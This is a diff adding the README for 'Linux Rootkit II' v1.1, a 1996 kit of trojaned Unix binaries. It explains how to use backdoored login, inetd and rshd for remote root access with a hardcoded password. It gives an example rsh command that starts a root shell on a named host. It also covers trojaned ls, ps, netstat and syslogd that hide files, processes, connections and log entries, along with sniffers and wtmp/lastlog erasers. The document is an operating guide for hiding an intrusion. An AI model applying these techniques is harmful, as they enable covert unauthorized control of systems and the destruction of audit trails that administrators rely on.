@@ -1,0 +1,201 @@
+Cybernetik proudly presents...
+ _     _                    ____             _   _    _ _     ___ ___
+| |   (_)_ __  _   ___  __ |  _ \ ___   ___ | |_| | _(_) |_  |_ _|_ _|
+| |   | | '_ \| | | \ \/ / | |_) / _ \ / _ \| __| |/ / | __|  | | | |
+| |___| | | | | |_| |>  <  |  _ < (_) | (_) | |_|   <| | |_   | | | |
+|_____|_|_| |_|\__,_/_/\_\ |_| \_\___/ \___/ \__|_|\_\_|\__| |___|___| V1.1
+
+		   Released 20/04/96 "It worked perfectly on *MY* system ;)"
+
+UPDATES
+1.1	Fixed login bug (didn't set HISTFILE properly. duh!)
+
+	Fixed BIG inetd bug. Alright so I forgot to try it with the service 
+	enabled. Sorry, I found this out the hard way too. (Not that anybody
+	has complained yet :)
+
+	Included linsniffer, a more practical sniffer.
+ 
+	Included wted and lled, two programs I wrote a while ago... the
+	main difference between these and zap is that these actually REMOVE
+	entries leaving no traces.
+
+	Included bindshell.c coded by Pluvius.
+
+	Added SHOWFLAG to netstat.
+
+This packages includes the following:
+
+chfn		Trojaned! User->r00t
+chsh		Trojaned! User->r00t
+inetd		Trojaned! Remote access
+login		Trojaned! Remote access
+ls		Trojaned! Hide files
+du		Trojaned! Hide files
+ifconfig	Trojaned! Hide sniffing
+netstat		Trojaned! Hide connections
+passwd		Trojaned! User->r00t
+ps		Trojaned! Hide processes
+top		Trojaned! Hide processes
+rshd		Trojaned! Remote access
+syslogd		Trojaned! Hide logs
+linsniffer	A kewl sniffz0r!
+sniffit		Another kewl sniffer!
+fix		File fixer!
+z2		Zap2 utmp/wtmp/lastlog eraser!
+wted		wtmp/utmp editor!
+lled		lastlog editor!
+bindshell	port/shell type daemon!
+		
+INSTALLATION
+To install this kit execute the command 'make all install' from ya # prompt.
+All of the files/password configuration is in rootkit.h so feel free to
+personalise your own version of lrk2 :-) It probably won't compile everything
+on older systems but thats life. Everything here has been tested on a slackware
+3.0 distribution, on other systems there were minor errors but these could be
+fixed by adding the odd #include or removing the offending code.  
+
+USAGE
+OK I will go thru how to use each program one by one. NOTE when I say password
+I mean the rootkit password not your users password (doh!). By default the
+rootkit password is lrkr0x.
+
+chfn -		Local user->root. Run chfn then when it asks you for a new name
+		enter your password.
+
+chsh -		Local user->root. Run chsh when it asks you for a new shell
+		enter your password.
+
+inetd -	 	Binds a shell to a port for remote access. hehe look at the
+		source if u want this one =)
+
+login -		Allows login to any account with the rootkit password.
+		If root login is refused on your terminal login as "rewt".
+		History logging is disabled if you login using your password.
+
+ls -		Trojaned to hide specified files and dirs.
+		Default data file is /dev/ptyr.
+		All files can be listed with 'ls -/'.
+		The format of /dev/ptyr is:
+		ptyr
+		hack.dir
+		w4r3z
+		ie. just the filenames. This would hide any files/dirs with the
+		names ptyr, hack.dir and w4r3z.
+
+du -		Same as ls, 'cept for du instead :)
+
+ifconfig -	Modified to remove PROMISC flag when sniffing.
+
+netstat -	Modified to remove tcp/udp/sockets from or to specified
+		addresses, uids and ports.
+		default data file: /dev/ptyq
+		command 0: hide uid
+		command 1: hide local address
+		command 2: hide remote address
+		command 3: hide local port
+		command 4: hide remote port
+		command 5: hide UNIX socket path
+
+		example:
+		0 500           <- Hides all connections by uid 500
+		1 128.31        <- Hides all local connections from 128.31.X.X
+		2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
+		3 8000          <- Hides all local connections from port 8000
+		4 6667          <- Hides all remote connections to port 6667
+		5 .term/socket  <- Hides all UNIX sockets including the path 
+				   .term/socket
+		
+		Yeah eyem lazy. This is ira's description. Why bother thinking
+		up werds when someones already done it?
+
+passwd -	Local user->root. Enter your rootkit password instead of your
+		old password.
+
+ps -		Modified to remove specified processes.
+		Default data file is /dev/ptyp.
+		An example data file is as follows:
+        	0 0             Strips all processes running under root
+        	1 p0            Strips tty p0
+        	2 sniffer       Strips all programs with the name sniffer
+		Don't put in the comments, obviously.
+
+top -		Identical to ps, 'cept for top instead.
+
+rshd -		Execute remote commands as root. 
+		Usage: rsh -l rootkitpassword host command
+		ie. rsh -l lrkr0x cert.org /bin/sh -i
+		    would start a root shell.
+
+syslogd -	Modified to remove specified strings from logging.
+		I thought of this one when I was on a system which logged
+		every connection.. I kept getting pissed off with editing
+		files every time I connected to remove my hostname. Then I 
+		thought 'Hey dude, why not trojan syslogd?!' and the rest
+		is history. :)
+		Default data file is /dev/ptys
+		Example data file:
+		evil.com
+		123.100.101.202
+		rshd
+		This would remove all logs containing the strings evil.com,
+		123.100.101.202 and rshd. Smart! :))
+
+sniffit -	An advanced network sniffer. This is pretty kewl and has lots
+		of filtering options and other stuff. Useful for targetting a
+		single host or net. Sniffit uses ncurses.
+
+linsniffer -	A kewl sniffer. This is smaller than sniffit and doesn't need
+		the ncurses libraries.  
+		As CERT say, sniffing is responsible for more mass network
+		breakins than anything else in the 90's. P'raps they ain't
+		heard of Sendmail before hahahaha  
+
+fix -		Replaces and fixes timestamp/checksum infomation on files.
+		I modified this a bit for my own uses and to fix a nasty bug
+		when replacing syslogd and inetd. The replacement file will
+		be erased by fix (unlike other versions).  
+
+z2 -		Zapper2! Run this to erase the last utmp/wtmp/lastlog entries
+		for a username. This can be detected since it just nulls the
+		entry out but no sysadmins know this, right?
+
+wted -		This does lots of stuff. U can view ALL the entries in a wtmp
+		or utmp type file, erase entries by username or hostname,
+		view zapped users (admins use a util similar to this to find
+		erased entries), erase zapped users etc.
+
+lled -		Basically the same as wted but for lastlog entries. 
+
+SOURCES
+Some of these patches are derived from the original SunOS rootkit, the ps and
+top patches came from the first linux rootkit by ira. All of the others were
+patched by moi. I patched just about everything I could think of. njoi ;-)
+
+OTHER STUFF
+If u wanna send me some email direct it towards na470561@anon.penet.fi.
+I welcome all unreleased exploits, passwd files and offers of cash/women :)
+
+If its important then ENCRYPT IT!  My pgp key is:
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.2i
+
+mQCNAzCG73gAAAEEAMbBS1Oy56dSvCbKBrPYj9Hz6g9c19bEW09H6+EDuYwjtWIP
+b393hPkrbQqGje/kVqaip8uzaN70oyME40V36YU5/VN30yhLUA9XKkw3o00PE4Co
+nT/mcN8z+dV69y7+M8lXv50J0FyWfcdAjlYz0NAdiLXG1t0pvvs6puG4V+tRAAUR
+tCNDeWJlcm5ldGlrIDxuYTQ3MDU2MUBhbm9uLnBlbmV0LmZpPg==
+=mh5d
+-----END PGP PUBLIC KEY BLOCK-----
+
+Check out these kewl sites:	ftp://ftp.infonexus.com
+				http://www.paranoia.com/~coldfire
+				http://www.unix.geek.net/~arny
+				http://www.cyberspace.org/~darkcyde
+				http://underground.org
+
+Lastly, don't rely on just this kit to keep yourself hidden. Learn unix,
+learn C, learn how to hack properly rather than just being a kr4d 3l33t
+sKr1ptZ h4q3R. This kit won't save you from good logging or active network
+monitoring. If you don't understand what this kit does then read the source
+code. In short - use yer brain.
